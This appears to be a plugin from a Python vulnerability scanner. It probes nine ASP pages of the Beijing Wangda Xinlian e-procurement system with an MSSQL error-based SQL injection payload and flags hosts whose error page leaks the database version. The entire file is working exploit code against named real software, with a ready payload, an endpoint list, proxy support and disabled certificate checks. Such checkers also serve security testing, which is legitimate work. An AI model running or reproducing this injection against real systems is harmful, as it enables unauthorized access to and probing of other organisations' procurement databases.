#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 北京网达信联电子采购系统多处注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0122276
author: Ascotbe
reference: Lucifer
description: 多处mssql注入。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "%27AnD%20ChAr(65)%2BChAr(71)%2BChAr(81)%2B@@version>0--"
urls = ["/Rat/ebid/viewInvite3.asp?InviteId=0000002852",
        "/Rat/ebid/viewInvite4.asp?InviteId=0000002852",
        "/Rat/ebid/viewInvite5.asp?InviteId=0000002852",
        "/Rat/ebid/viewInvite6.asp?InviteId=0000002852",
        "/Rat/ebid/viewInvite2.asp?InviteId=0000002852",
        "/Rat/ebid/viewInvite1.asp?InviteId=0000002852",
        "/Rat/EBid/ViewClarify1.asp?InviteId=11",
        "/Rat/EBid/ViewClarify.asp?InviteId=11",
        "/Rat/EBid/AuditForm/AuditForm_ExpertForm.asp?InviteId=11"]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    Medusas=[]
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        for turl in urls:
            payload_url = scheme + "://" + url + turl + payload
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if code==500 and con.lower().find('agqmicrosoft')!=-1:
                Medusa = "{} 存在北京网达信联电子采购系统注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                Medusas.append(str(Medusa))
    except Exception as e:
        pass
    return Medusas